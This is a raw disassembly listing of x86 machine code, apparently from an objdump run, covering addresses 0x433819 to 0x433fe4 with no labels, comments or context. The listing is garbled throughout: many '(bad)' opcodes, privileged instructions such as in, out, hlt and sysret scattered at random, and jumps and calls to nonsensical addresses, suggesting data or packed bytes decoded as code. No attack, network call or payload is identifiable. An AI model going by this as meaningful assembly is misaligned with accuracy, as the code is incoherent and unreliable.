  433819:	sub    esp,DWORD PTR [ebx-0x77]
  43381c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  433823:	or     ah,bh
  433825:	pop    es
  433826:	ds cdq 
  433828:	push   DWORD PTR [edx]
  43382a:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  433830:	(bad)  
  433831:	mov    bh,bh
  433833:	jmp    0x433821
  433835:	leave  
  433836:	jne    0x433840
  433838:	call   0x303192
  43383d:	in     al,dx
  43383e:	dec    ebp
  43383f:	add    dh,BYTE PTR [ebx]
  433841:	add    BYTE PTR [ebx],al
  433843:	inc    ebp
  433844:	cmp    esi,DWORD PTR [esi]
  433846:	je     0x4337e4
  433848:	mov    eax,edi
  43384a:	or     al,0xf0
  43384c:	add    BYTE PTR [ebp+0x458bf845],al
  433852:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  433858:	adc    al,0x7
  43385a:	enter  0x9fc0,0xa5
  43385e:	rol    BYTE PTR [eax],0x5e
  433861:	mov    ecx,ecx
  433863:	or     al,0xc
  433865:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  43386c:	jmp    0x43386d
  43386e:	push   ebp
  43386f:	mov    esp,ebp
  433871:	cld    
  433872:	inc    ebp
  433873:	inc    ebp
  433874:	or     DWORD PTR [ecx+0x457dec10],0x0
  43387b:	push   esi
  43387c:	push   esi
  43387d:	mov    edi,0x7af080f
  433882:	add    bh,al
  433884:	test   DWORD PTR [ecx+0x3a7320f],ebx
  43388a:	add    BYTE PTR [ecx+0x4540100f],cl
  433890:	mov    ebp,eax
  433892:	mov    ebp,edi
  433894:	lock call edx
  433897:	fcom   DWORD PTR [ebp+0x45]
  43389a:	mov    eax,0x148a8b
  43389f:	push   ecx
  4338a0:	enter  0xc145,0x83
  4338a4:	cmp    cl,BYTE PTR [eax]
  4338a6:	add    BYTE PTR [ebp+0x4d],al
  4338a9:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4338af:	call   0xffa3341e
  4338b4:	cmp    eax,DWORD PTR [ebp-0xc]
  4338b7:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4338bb:	push   ebp
  4338bc:	(bad)
  4338bf:	std    
  4338c0:	lock push DWORD PTR [edi+0x5d08fcdb]
  4338c7:	inc    ebp
  4338c8:	(bad)  
  4338c9:	call   0xff7d3559
  4338ce:	add    al,BYTE PTR [ebp+0x37]
  4338d1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  4338d7:	jne    0x4338d9
  4338d9:	(bad)  
  4338da:	cmp    edi,esp
  4338dc:	jne    0x43390f
  4338de:	mov    edi,edi
  4338e0:	or     BYTE PTR [ebx-0x307f0b49],cl
  4338e6:	pop    ds
  4338e7:	into   
  4338e8:	je     0x4338ab
  4338ea:	mov    ebx,DWORD PTR [esi]
  4338ec:	or     BYTE PTR [ebp-0x49],al
  4338ef:	mov    esp,DWORD PTR [esi-0x77]
  4338f2:	mov    esi,0xfe451f0c
  4338f7:	mov    eax,DWORD PTR [eax]
  4338f9:	or     al,0x66
  4338fb:	sar    bl,0x3b
  4338fe:	xor    esi,DWORD PTR [ebp+0x66]
  433901:	xor    ecx,edi
  433903:	pop    edi
  433904:	adc    bl,BYTE PTR [ebx+0x7e]
  433907:	ret    0xff
  43390a:	cld    
  43390b:	inc    ebp
  43390c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433912:	cld    
  433913:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  43391a:	push   0xffffff83
  43391c:	pop    edi
  43391d:	or     BYTE PTR [ebp+0x53],dh
  433920:	xorps  xmm1,xmm2
  433923:	test   BYTE PTR [eax+eax*1],bh
  433926:	add    BYTE PTR [eax],al
  433928:	adc    eax,eax
  43392a:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  433932:	jmp    DWORD PTR [eax]
  433934:	ror    al,0x5e
  433937:	inc    ebp
  433938:	leave  
  433939:	xor    ecx,DWORD PTR [eax]
  43393b:	and    DWORD PTR [ebx-0x3ec70708],ecx
  433941:	add    ch,al
  433943:	xor    edi,edi
  433945:	xor    DWORD PTR [ebx],0x660033fe
  43394b:	mov    DWORD PTR [ebp-0xc],ecx
  43394e:	pcmpgtw mm0,mm0
  433951:	add    dl,ah
  433953:	leave  
  433954:	mov    edi,DWORD PTR [eax-0x7d]
  433957:	push   ax
  433959:	dec    ebp
  43395a:	mov    esi,DWORD PTR [ebx-0x75]
  43395d:	lea    ebp,[eax-0x7c00fffe]
  433963:	xor    eax,DWORD PTR [eax]
  433965:	sysret 
  433967:	dec    ebp
  433968:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  43396f:	push   WORD PTR [ecx+0x8]
  433973:	jne    0x433936
  433975:	ud0    ecx,DWORD PTR [ecx]
  433978:	mov    edi,DWORD PTR [edx]
  43397a:	lods   al,BYTE PTR ds:[esi]
  43397b:	add    BYTE PTR [eax],al
  43397d:	data16 (bad) 
  43397f:	iret   
  433980:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433987:	cli    
  433988:	inc    ebp
  433989:	cmp    al,0x8d
  43398b:	add    BYTE PTR [esi+0x2d],ah
  43398e:	inc    ebp
  43398f:	pop    ebp
  433990:	lea    ecx,[edi]
  433992:	mov    dl,bh
  433994:	add    BYTE PTR [edi],cl
  433996:	mov    DWORD PTR [eax+eax*8],edi
  433999:	mov    ebx,0x3a87
  43399e:	add    BYTE PTR [ebx],ch
  4339a0:	inc    ebp
  4339a1:	data16 (bad) 
  4339a3:	clc    
  4339a4:	int3   
  4339a5:	cmp    eax,DWORD PTR [eax]
  4339a7:	je     0x433932
  4339a9:	push   0xffffffc8
  4339ab:	pop    edi
  4339ac:	xchg   DWORD PTR [ebp+0x0],eax
  4339af:	data16 add BYTE PTR [ebp+0x45],cl
  4339b3:	lea    cx,[ebp+0x10]
  4339b7:	jb     0x4339b9
  4339b9:	jmp    0x433944
  4339bb:	call   eax
  4339bd:	clc    
  4339be:	xchg   DWORD PTR [edi+0x1],edi
  4339c1:	mov    eax,DWORD PTR [eax]
  4339c3:	or     BYTE PTR [ebp-0x49],al
  4339c6:	lea    eax,[eax+0x74003154]
  4339cc:	push   edi
  4339cd:	inc    edx
  4339ce:	jge    0x4339cf
  4339d0:	mov    DWORD PTR [edi],ecx
  4339d2:	fdiv   DWORD PTR [edi-0x6]
  4339d5:	inc    DWORD PTR [eax]
  4339d7:	xor    edx,DWORD PTR [eax+0x5f]
  4339da:	xchg   DWORD PTR [ebx+0x1],ebx
  4339dd:	ret    0x0
  4339e0:	xor    BYTE PTR [ebp-0x51],cl
  4339e3:	cmp    edi,0xf0ff8902
  4339e9:	data16 ror al,0x84
  4339ed:	rol    BYTE PTR [eax],0x3b
  4339f0:	add    al,dh
  4339f2:	dec    eax
  4339f3:	xchg   esp,eax
  4339f4:	push   ebx
  4339f5:	jmp    0x433982
  4339f7:	push   ebp
  4339f8:	add    esp,ebp
  4339fa:	add    ebp,esp
  4339fc:	mov    edx,DWORD PTR [edi+0x24]
  4339ff:	clc    
  433a00:	dec    esi
  433a01:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433a07:	cmp    BYTE PTR [ebx],al
  433a09:	jne    0x433994
  433a0b:	xor    esp,eax
  433a0d:	jmp    0x463b90
  433a12:	add    ebp,DWORD PTR [ecx+ecx*4]
  433a15:	jne    0x433a0b
  433a17:	call   0xffcd3771
  433a1c:	clc    
  433a1d:	xchg   edi,eax
  433a1e:	sti    
  433a1f:	add    DWORD PTR [ebx],eax
  433a21:	add    BYTE PTR [ebp+0x47],bl
  433a24:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433a2a:	pop    ebp
  433a2b:	mov    DWORD PTR [esi-0x48],esi
  433a2e:	jmp    0x433a77
  433a30:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433a36:	(bad)  
  433a38:	cmp    al,0x0
  433a3a:	cmp    eax,DWORD PTR [ebp+0x18]
  433a3d:	lea    ebx,[ebp-0x56]
  433a40:	jle    0x433a42
  433a42:	jae    0x4339cd
  433a44:	mov    eax,esp
  433a46:	call   0xb900:0x8b005587
  433a4d:	inc    ebp
  433a4e:	push   ebp
  433a4f:	lea    ecx,[ebp-0x27ff4f12]
  433a55:	mov    eax,edi
  433a57:	int3   
  433a58:	push   ebp
  433a59:	xchg   edi,eax
  433a5b:	add    esp,ebp
  433a5d:	add    BYTE PTR [eax],al
  433a5f:	inc    ebp
  433a60:	add    BYTE PTR [ebp+0x8b3255],cl
  433a66:	cld    
  433a67:	mov    DWORD PTR [edx],edi
  433a69:	aam    0x75
  433a6b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433a71:	mov    DWORD PTR [ebx-0x50],edx
  433a74:	test   BYTE PTR [ebp-0x1],0xe8
  433a78:	mov    eax,DWORD PTR [eax]
  433a7a:	hlt    
  433a7b:	add    al,al
  433a7d:	mov    eax,DWORD PTR ds:0x890045a8
  433a83:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433a89:	inc    DWORD PTR [eax*2+0xf75854d]
  433a90:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433a96:	call   0x729997d7
  433a9b:	je     0x433afb
  433a9d:	js     0x433afe
  433a9f:	lock ret 0x7e
  433aa3:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433aa9:	mov    edi,edi
  433aab:	sbb    al,bl
  433aad:	clc    
  433aae:	add    BYTE PTR [ebp-0x73],bh
  433ab1:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433ab7:	ror    BYTE PTR [eax],1
  433ab9:	dec    ebp
  433aba:	xchg   ebp,eax
  433abb:	mov    edi,edi
  433abd:	in     al,0x8b
  433abf:	jge    0x433a4a
  433ac1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433ac7:	clc    
  433ac8:	pop    esi
  433ac9:	fist   DWORD PTR [ebp+0x5d398b5d]
  433acf:	clc    
  433ad0:	add    al,0x6e
  433ad2:	mov    eax,DWORD PTR [ebx]
  433ad4:	mov    BYTE PTR [ebp+0x0],dl
  433ad7:	mov    edx,DWORD PTR [ebx-0x20]
  433ada:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433ae0:	add    eax,0x3b3a73
  433ae5:	adc    al,0x89
  433ae7:	pop    eax
  433ae8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433aec:	ret    0xf08
  433aef:	cmp    al,0x2
  433af1:	mov    DWORD PTR [edx],edi
  433af3:	cld    
  433af4:	add    BYTE PTR [ebp+0x66],dl
  433af7:	add    eax,ebx
  433af9:	add    esp,eax
  433afb:	sub    eax,eax
  433afd:	or     BYTE PTR [ecx-0x77f474bb],cl
  433b03:	add    BYTE PTR [eax],al
  433b05:	mov    DWORD PTR [ebx-0x24],ebx
  433b08:	push   edi
  433b09:	push   ebp
  433b0a:	clc    
  433b0b:	add    DWORD PTR [esi+0x1b0100],0x45
  433b12:	out    0xff,eax
  433b14:	add    edx,DWORD PTR [eax]
  433b16:	jmp    0x433b00
  433b18:	cmp    ch,0x44
  433b1b:	(bad)  
  433b1c:	jmp    0x40c8c36e
  433b21:	je     0x433aad
  433b23:	mov    eax,DWORD PTR [eax-0x10c78104]
  433b29:	inc    ebp
  433b2a:	add    BYTE PTR [ebx-0x770375],al
  433b30:	add    ah,ch
  433b32:	add    edx,esp
  433b34:	pop    edi
  433b35:	pop    ebp
  433b36:	push   ebp
  433b37:	inc    ebx
  433b38:	in     al,dx
  433b39:	pop    ebp
  433b3a:	in     al,dx
  433b3b:	cmp    edx,DWORD PTR [edi-0x8]
  433b3e:	ss xchg esp,eax
  433b40:	pushf  
  433b41:	pop    ebx
  433b42:	mov    ecx,ecx
  433b44:	call   0x8998824d
  433b49:	in     al,dx
  433b4a:	in     al,0x45
  433b4c:	dec    ebp
  433b4d:	push   esi
  433b4e:	test   DWORD PTR [eax+0xfb010f],esi
  433b54:	add    BYTE PTR [eax+0xc018b],dh
  433b5a:	leave  
  433b5b:	inc    ebp
  433b5c:	test   al,ch
  433b5e:	add    dh,bh
  433b60:	add    bh,bh
  433b62:	dec    ebp
  433b63:	push   cs
  433b64:	mov    DWORD PTR [ecx],eax
  433b66:	hlt    
  433b67:	push   es
  433b68:	dec    ebp
  433b69:	leave  
  433b6a:	mov    DWORD PTR [eax],ecx
  433b6c:	clc    
  433b6d:	cmovge eax,ecx
  433b70:	mov    ecx,0x85c2f0
  433b76:	clc    
  433b77:	pop    DWORD PTR [ebp+0x1]
  433b7a:	push   ebx
  433b7b:	add    BYTE PTR [ebp-0x15],bh
  433b7e:	push   esi
  433b7f:	xor    eax,0x898a45
  433b84:	cld    
  433b85:	inc    BYTE PTR [ebp+0x0]
  433b88:	cmp    BYTE PTR [esi-0x64],ah
  433b8b:	add    DWORD PTR [esi+0x78308c1],edi
  433b91:	add    ah,BYTE PTR [edi-0x49]
  433b94:	int    0xbb
  433b96:	mov    ecx,DWORD PTR [edi+0xc]
  433b99:	add    dh,al
  433b9b:	cmp    ecx,ebx
  433b9d:	jne    0x433b67
  433b9f:	xor    ecx,DWORD PTR [ebp+0x66]
  433ba2:	jmp    0xca3ba8
  433ba7:	add    DWORD PTR [ebp+0x0],eax
  433baa:	mov    eax,ebx
  433bac:	or     al,0x8b
  433bae:	(bad)  
  433baf:	mov    ecx,esi
  433bb1:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433bb8:	mov    eax,edi
  433bba:	or     BYTE PTR [edx],cl
  433bbc:	shl    cl,cl
  433bbe:	icebp  
  433bbf:	add    BYTE PTR [ebp+0x3a],0x8b
  433bc3:	or     BYTE PTR [edx+eax*2],cl
  433bc6:	(bad)  
  433bc7:	or     cl,dh
  433bc9:	stc    
  433bca:	shl    DWORD PTR [ebp-0x30],0xc6
  433bce:	xor    al,0x0
  433bd0:	inc    ebp
  433bd1:	xchg   BYTE PTR [ebx],al
  433bd3:	add    esp,edi
  433bd5:	add    BYTE PTR [ebp-0x39],cl
  433bd8:	mov    al,bl
  433bda:	test   DWORD PTR [ebx+0x1c348375],ecx
  433be0:	sub    al,0xbf
  433be2:	jmp    0x433b69
  433be4:	mov    edi,eax
  433be6:	lock jge 0x433bda
  433be9:	lea    esi,[edx-0x74bad5fd]
  433bef:	mov    ebp,esp
  433bf1:	or     cl,dh
  433bf3:	leave  
  433bf4:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433bfb:	dec    ebp
  433bfc:	dec    ebp
  433bfd:	test   DWORD PTR [ebx],eax
  433bff:	paddb  mm6,mm0
  433c02:	add    DWORD PTR [eax],eax
  433c04:	dec    ebp
  433c05:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433c0b:	mov    esi,DWORD PTR [edx]
  433c0d:	or     al,0x2b
  433c0f:	dec    ebp
  433c10:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433c16:	mov    esp,edx
  433c18:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433c1f:	mov    DWORD PTR [ebx],ebp
  433c21:	call   0xc76c551
  433c26:	mov    DWORD PTR [ebp+0x10],ecx
  433c29:	(bad)  
  433c2a:	push   0x8b85ff10
  433c2f:	clc    
  433c30:	or     al,0x51
  433c32:	(bad)  
  433c33:	push   ecx
  433c34:	retf   
  433c35:	mov    ebx,0xff4d8dc8
  433c3a:	mov    DWORD PTR [ebp+0x8],eax
  433c3d:	xor    eax,DWORD PTR [ebp-0x75]
  433c40:	cmp    ebp,DWORD PTR [ebx]
  433c42:	lsl    ebx,WORD PTR [edi-0x8]
  433c46:	call   DWORD PTR [ebx-0x741bff75]
  433c4c:	(bad)  
  433c4d:	or     al,0x5b
  433c4f:	dec    ebp
  433c50:	or     BYTE PTR [ebx],dh
  433c52:	inc    ebp
  433c53:	xor    esi,DWORD PTR ds:0x708088d
  433c59:	in     eax,0x99
  433c5b:	add    BYTE PTR [edx],dh
  433c5d:	inc    ebp
  433c5e:	pop    edi
  433c5f:	xor    eax,edx
  433c61:	test   DWORD PTR [eax],0x81108b8b
  433c67:	dec    ebp
  433c68:	sub    al,0x33
  433c6a:	add    BYTE PTR [ebx],dh
  433c6c:	push   esi
  433c6d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433c73:	mov    edi,eax
  433c75:	or     BYTE PTR [ebp+0x45],al
  433c78:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433c7e:	ss leave 
  433c80:	pushf  
  433c81:	push   es
  433c82:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433c8a:	inc    ebp
  433c8b:	cmp    BYTE PTR [esi],0x51
  433c8e:	pushf  
  433c8f:	addr16 (bad) 
  433c91:	shl    esp,1
  433c93:	dec    ebp
  433c94:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433c9a:	(bad)  
  433c9b:	jmp    0x8c0b0f77
  433ca0:	aam    0x8
  433ca2:	test   DWORD PTR [ebp-0x8],ecx
  433ca5:	mov    BYTE PTR [ebp-0x75],al
  433ca8:	or     BYTE PTR [eax],cl
  433caa:	add    BYTE PTR [ebp-0x75],dl
  433cad:	mov    eax,0xfc728b
  433cb2:	dec    ebp
  433cb3:	enter  0xceba,0x8
  433cb7:	retf   0x1807
  433cba:	ret    0x994d
  433cbd:	mov    esi,DWORD PTR [edx]
  433cbf:	or     al,0x33
  433cc1:	into   
  433cc2:	add    edx,esi
  433cc4:	add    ecx,edx
  433cc6:	bswap  eax
  433cc8:	ror    esi,0x98
  433ccb:	dec    ebp
  433ccc:	add    cl,ch
  433cce:	mov    edi,edi
  433cd0:	hlt    
  433cd1:	inc    esi
  433cd3:	inc    ebp
  433cd4:	ret    0x4533
  433cd7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433cdd:	or     BYTE PTR [ebx],dh
  433cdf:	dec    ebp
  433ce0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433ce6:	jne    0xff8d3cad
  433cec:	inc    ebp
  433ced:	inc    ebp
  433cee:	mov    esi,DWORD PTR [ebx]
  433cf0:	clc    
  433cf1:	pop    esi
  433cf2:	ret    0xcaeb
  433cf5:	mov    eax,esi
  433cf7:	call   0x52048eca
  433cfc:	dec    ebp
  433cfd:	add    eax,0xf8728b
  433d02:	adc    eax,0xce0ccac9
  433d07:	push   ebp
  433d08:	ret    0xc6ec
  433d0b:	in     al,dx
  433d0c:	call   0x33438a15
  433d11:	push   edi
  433d12:	add    edi,eax
  433d14:	xor    eax,eax
  433d16:	jmp    0x433d5d
  433d18:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433d1e:	add    eax,edi
  433d20:	shr    eax,cl
  433d22:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433d28:	mov    edi,DWORD PTR [ecx]
  433d2a:	in     al,dx
  433d2b:	pushf  
  433d2c:	ret    0x84c7
  433d2f:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433d35:	inc    ebp
  433d36:	in     al,dx
  433d37:	ss inc ebp
  433d39:	pushf  
  433d3a:	mov    eax,edi
  433d3c:	cld    
  433d3d:	fmul   st(2),st
  433d3f:	sbb    dl,al
  433d41:	jmp    0x9c3b:0x374d45c1
  433d48:	jbe    0x433d11
  433d4a:	mov    esp,eax
  433d4c:	clc    
  433d4d:	add    BYTE PTR [ebp+0x0],cl
  433d50:	mov    ecx,ecx
  433d52:	lea    eax,[ebp-0x5]
  433d55:	mov    edi,edi
  433d57:	call   0x51ce8ea1
  433d5c:	hlt    
  433d5d:	xor    eax,edx
  433d5f:	mov    esi,0x997284
  433d64:	xor    cl,dl
  433d66:	mov    esi,eax
  433d68:	hlt    
  433d69:	into   
  433d6a:	inc    ebp
  433d6b:	scas   eax,DWORD PTR es:[edi]
  433d6c:	mov    ebp,ecx
  433d6e:	cld    
  433d6f:	add    dl,cl
  433d71:	add    dl,al
  433d73:	inc    ebp
  433d74:	shr    DWORD PTR [ebx],0x4d
  433d77:	xor    edi,DWORD PTR [ebx]
  433d79:	mov    DWORD PTR [edi],ecx
  433d7b:	clc    
  433d7c:	dec    esi
  433d7d:	inc    ebp
  433d7e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433d84:	ret    0xc6ca
  433d87:	mov    BYTE PTR [ebp-0x32],0x53
  433d8b:	scas   eax,DWORD PTR es:[edi]
  433d8c:	inc    ebp
  433d8d:	jmp    0x433dc6
  433d8f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433d96:	pop    ebx
  433d97:	xor    ecx,DWORD PTR [ebp+0x3]
  433d9a:	mov    eax,DWORD PTR [ebx]
  433d9c:	clc    
  433d9d:	test   edx,ecx
  433d9f:	mov    ecx,esi
  433da1:	cld    
  433da2:	call   0x8ab782ec
  433da7:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433dad:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433db3:	fdiv   QWORD PTR [ebx]
  433db5:	retf   0xce89
  433db8:	in     al,0xc1
  433dba:	inc    ebp
  433dbb:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433dc1:	into   
  433dc2:	mov    dh,0xc1
  433dc5:	call   0x8c17834e
  433dca:	(bad)  
  433dcb:	cld    
  433dcc:	mov    ecx,DWORD PTR [ebp-0x14]
  433dcf:	xor    eax,ecx
  433dd1:	lea    eax,[ebp+0x8]
  433dd4:	mov    esi,DWORD PTR [edx-0x4]
  433dd7:	add    dl,al
  433dd9:	inc    ebp
  433dda:	mov    esp,0x32d8998b
  433ddf:	dec    ebp
  433de0:	mov    esi,DWORD PTR [ebx]
  433de2:	cld    
  433de3:	xor    eax,edx
  433de5:	sub    esp,DWORD PTR [edi-0x75]
  433de8:	int    0xec
  433dea:	sub    ecx,eax
  433dec:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433df2:	mov    esi,esp
  433df4:	call   0x34178b7d
  433df9:	inc    DWORD PTR [ebx]
  433dfb:	mov    edi,DWORD PTR [ebx]
  433dfd:	cld    
  433dfe:	jne    0x433e4d
  433e00:	mov    esi,DWORD PTR [ebx]
  433e02:	aam    0x8d
  433e04:	dec    ebp
  433e05:	or     BYTE PTR [ebx],dh
  433e07:	jb     0x433e0c
  433e09:	add    BYTE PTR [edi+0x45],bl
  433e0c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  433e13:	xor    ebp,esp
  433e15:	xor    eax,edi
  433e17:	sub    edi,esp
  433e19:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  433e1f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433e26:	inc    ebp
  433e27:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433e2d:	clc    
  433e2e:	mov    eax,edi
  433e30:	nop
  433e31:	fadd   QWORD PTR [eax]
  433e33:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433e39:	jmp    0x433dc4
  433e3b:	mov    eax,DWORD PTR [ecx]
  433e3d:	fadd   DWORD PTR [eax]
  433e3f:	inc    ebp
  433e40:	or     DWORD PTR [ebx],esi
  433e42:	dec    eax
  433e43:	add    edx,DWORD PTR [ebx-0x2d]
  433e46:	dec    ebp
  433e47:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433e4d:	inc    ebp
  433e4e:	push   ecx
  433e4f:	mov    dl,BYTE PTR [ecx-0xd]
  433e52:	xor    ecx,DWORD PTR [ebp-0x45]
  433e55:	(bad)  
  433e57:	rol    BYTE PTR [eax],0xc1
  433e5a:	ret    
  433e5b:	inc    ebp
  433e5c:	inc    ebp
  433e5d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433e63:	xor    eax,ebx
  433e65:	add    eax,DWORD PTR [ebp+0x23]
  433e68:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  433e6e:	cmp    edi,0xc
  433e71:	dec    ebp
  433e72:	inc    ebp
  433e73:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433e79:	inc    ebp
  433e7a:	mov    esi,DWORD PTR [ebx]
  433e7c:	clc    
  433e7d:	lea    eax,[ebp+0x45725407]
  433e83:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433e87:	xor    edi,DWORD PTR [eax]
  433e89:	mov    ecx,0xff8b8d4d
  433e8e:	push   esp
  433e8f:	enter  0x4df7,0x23
  433e93:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433e99:	mov    eax,DWORD PTR [ebx]
  433e9b:	loopne 0x433e88
  433e9d:	ret    0xc68b
  433ea0:	push   esp
  433ea1:	enter  0x9745,0x8b
  433ea5:	inc    ebp
  433ea6:	cld    
  433ea7:	mov    eax,edi
  433ea9:	clc    
  433eaa:	ret    
  433eab:	ret    0xc645
  433eae:	mov    esi,DWORD PTR [ebx]
  433eb0:	cld    
  433eb1:	pop    esi
  433eb2:	mov    ebx,0x83458bc3
  433eb8:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433ebc:	dec    ebp
  433ebd:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  433ec5:	clc    
  433ec6:	fcom   DWORD PTR [ebp+0x45]
  433ec9:	mov    edi,DWORD PTR [eax]
  433ecb:	adc    al,0x9c
  433ecd:	inc    ebp
  433ece:	(bad)  
  433ecf:	mov    ebx,eax
  433ed1:	adc    al,0x85
  433ed3:	cmp    al,0x1
  433ed6:	inc    ebp
  433ed7:	add    BYTE PTR [edx],bh
  433ed9:	dec    ebp
  433eda:	pushf  
  433edb:	mov    ebp,ecx
  433edd:	mov    eax,DWORD PTR [ebx]
  433edf:	nop
  433ee0:	add    BYTE PTR [eax],al
  433ee2:	inc    ebp
  433ee3:	mov    esi,DWORD PTR [ebx]
  433ee5:	add    eax,DWORD PTR [ebx]
  433ee7:	cmp    al,0x89
  433ee9:	mov    esp,esi
  433eeb:	clc    
  433eec:	inc    ebp
  433eed:	inc    ebp
  433eee:	add    edx,DWORD PTR [esi+0xc]
  433ef1:	mov    edi,0x7ff0845
  433ef6:	in     al,dx
  433ef7:	(bad)  
  433ef8:	jne    0x433e93
  433efa:	mov    esi,DWORD PTR [edx]
  433efc:	clc    
  433efd:	add    ebp,DWORD PTR [esi]
  433eff:	mov    edi,edi
  433f01:	in     al,dx
  433f02:	mov    DWORD PTR [ebp-0x10],eax
  433f05:	xor    eax,DWORD PTR [ebp+0x3]
  433f08:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  433f10:	(bad)  
  433f11:	push   eax
  433f12:	ret    
  433f13:	call   0xd4ffc8a5
  433f18:	call   0xffcf3762
  433f1d:	cmp    BYTE PTR [ebp+0x4d],al
  433f20:	test   DWORD PTR [eax+0x74],ecx
  433f23:	inc    ecx
  433f24:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433f2a:	ret    
  433f2b:	inc    eax
  433f2c:	dec    DWORD PTR [ebx+0x4945f8f0]
  433f32:	push   eax
  433f33:	dec    eax
  433f34:	test   al,0xd0
  433f36:	dec    eax
  433f38:	mov    eax,DWORD PTR [ebp-0x14]
  433f3b:	mov    eax,DWORD PTR [ebp+0x38]
  433f3e:	mov    eax,ecx
  433f40:	fadd   DWORD PTR [ebx]
  433f42:	dec    ebp
  433f43:	inc    eax
  433f44:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433f4a:	inc    ebp
  433f4b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433f51:	fadd   QWORD PTR [ebx]
  433f53:	inc    ebp
  433f54:	or     al,0x33
  433f56:	dec    ebp
  433f57:	add    edi,DWORD PTR [ebx]
  433f59:	mov    DWORD PTR [edx-0x28],esi
  433f5c:	mov    eax,DWORD PTR [ebp-0x10]
  433f5f:	mov    eax,DWORD PTR [eax+0x10]
  433f62:	mov    eax,edi
  433f64:	lock ret 
  433f66:	inc    ecx
  433f67:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433f6d:	fsubr  st,st(5)
  433f6f:	test   DWORD PTR [eax],eax
  433f71:	clc    
  433f72:	push   0x45
  433f74:	(bad)  
  433f75:	cmp    ebp,esp
  433f77:	pushf  
  433f78:	inc    ebp
  433f79:	(bad)  
  433f7a:	push   eax
  433f7b:	fsub   DWORD PTR [eax-0x7b]
  433f7e:	(bad)  
  433f7f:	clc    
  433f80:	mov    eax,0xf8008584
  433f85:	mov    eax,DWORD PTR [ebp-0x4]
  433f88:	mov    edi,0x4585c3cc
  433f8e:	clc    
  433f8f:	mov    eax,DWORD PTR [ebp+0x14]
  433f92:	cmp    BYTE PTR [ebp-0x64],al
  433f95:	mov    edi,eax
  433f97:	in     al,dx
  433f98:	les    esi,FWORD PTR [ebp-0x7b]
  433f9b:	mov    edi,eax
  433f9d:	or     al,0x4d
  433f9f:	dec    ebp
  433fa0:	mov    eax,ebp
  433fa2:	in     al,0xf2
  433fa4:	dec    ebp
  433fa5:	dec    DWORD PTR [ecx+0x4dc7e045]
  433fab:	fmul   DWORD PTR [ecx+0x4df8f085]
  433fb1:	inc    ebp
  433fb2:	mov    DWORD PTR [ebx],esi
  433fb4:	fadd   QWORD PTR [ebx]
  433fb6:	dec    ebp
  433fb7:	push   eax
  433fb8:	xor    eax,DWORD PTR [ebp+0x3]
  433fbb:	push   eax
  433fbc:	mov    DWORD PTR [eax+ebx*8],ebx
  433fbf:	push   esi
  433fc1:	mov    eax,DWORD PTR [eax]
  433fc3:	lock cmp eax,0xf84e85c0
  433fc9:	inc    ebp
  433fca:	test   BYTE PTR [ebx],dh
  433fcc:	add    DWORD PTR [ebx],eax
  433fce:	add    BYTE PTR [eax+0x4d],dl
  433fd1:	jne    0x434006
  433fd3:	lea    ecx,[ebx-0x7617fc44]
  433fd9:	div    ah
  433fdb:	inc    DWORD PTR [ebp+0x45]
  433fde:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433fe4:	jb     0x433f71
